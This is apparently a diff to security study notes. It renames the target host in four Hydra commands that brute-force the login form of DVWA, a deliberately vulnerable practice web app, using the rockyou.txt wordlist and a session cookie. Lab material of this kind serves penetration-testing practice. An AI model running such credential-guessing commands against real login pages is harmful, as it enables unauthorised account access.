@@ -73,10 +73,10 @@ Syntax:
 Examples:
 
 ```console
-hydra -l admin -P rockyou.txt foxtrot.vx http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low:F=Username and/or password incorrect.'
-hydra -l admin -P rockyou.txt foxtrot.vx http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low:S=Welcome'
-hydra -L users.txt -P rockyou.txt foxtrot.vx http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low:F=Username and/or password incorrect.'
-hydra -L users.txt -P rockyou.txt foxtrot.vx http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low:S=Welcome'
+hydra -l admin -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low:F=Username and/or password incorrect.'
+hydra -l admin -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low:S=Welcome'
+hydra -L users.txt -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low:F=Username and/or password incorrect.'
+hydra -L users.txt -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low:S=Welcome'
 ```
 
 #### Wordlists:
